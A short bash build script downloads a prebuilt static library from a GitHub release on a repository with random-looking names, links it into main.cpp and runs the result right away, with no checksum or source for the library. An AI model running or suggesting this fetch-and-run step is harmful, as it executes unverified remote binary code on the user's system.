#!/usr/bin/env bash
set -e
LIB="alpha-fog.a"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "https://github.com/tendertrailerdd/pysinkingsheet/releases/download/frosty-ember-calm-garden/alpha-fog.a"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
